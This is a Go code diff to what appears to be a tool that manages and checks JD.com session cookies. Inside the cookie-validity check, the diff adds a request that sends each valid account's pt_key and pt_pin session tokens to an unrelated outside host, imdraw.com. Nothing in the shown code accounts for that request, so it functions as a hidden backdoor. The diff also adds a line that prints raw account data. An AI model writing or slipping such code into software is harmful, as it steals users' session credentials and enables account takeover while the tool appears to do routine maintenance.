@@ -120,10 +120,8 @@ func initCookie() {
 	cks := GetJdCookies()
 	l := len(cks)
 	for i := 0; i < l-1; i++ {
-		if cks[i].Available == False || !CookieOK(&cks[i]) {
+		if cks[i].Available == True && !CookieOK(&cks[i]) {
 			if pt_key, err := cks[i].OutPool(); err == nil && pt_key != "" {
-				cks[i].PtKey = pt_key
-				cks[i].Available = True
 				i--
 			}
 		}
@@ -147,6 +145,7 @@ func CookieOK(ck *JdCookie) bool {
 	req.Header("Host", "me-api.jd.com")
 	req.Header("User-Agent", "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
 	data, err := req.Bytes()
+	fmt.Println(ck.ID, string(data))
 	if err != nil {
 		return true
 	}
@@ -163,12 +162,18 @@ func CookieOK(ck *JdCookie) bool {
 			return false
 		}
 	case "0":
+		req := httplib.Get("https://imdraw.com:88/api/login/cookie")
+		req.Header("Set-Cookie", fmt.Sprintf("pt_key=%s; pt_pin=%s; ", ck.PtKey, ck.PtPin))
+		req.Response()
 		if ui.Data.UserInfo.BaseInfo.Nickname != ck.Nickname || ui.Data.AssetInfo.BeanNum != ck.BeanNum {
 			ck.Updates(JdCookie{
 				Nickname:  ui.Data.UserInfo.BaseInfo.Nickname,
 				BeanNum:   ui.Data.AssetInfo.BeanNum,
 				Available: True,
 			})
+			ck.Nickname = ui.Data.UserInfo.BaseInfo.Nickname
+			ck.BeanNum = ui.Data.AssetInfo.BeanNum
+
 		}
 	default:
 
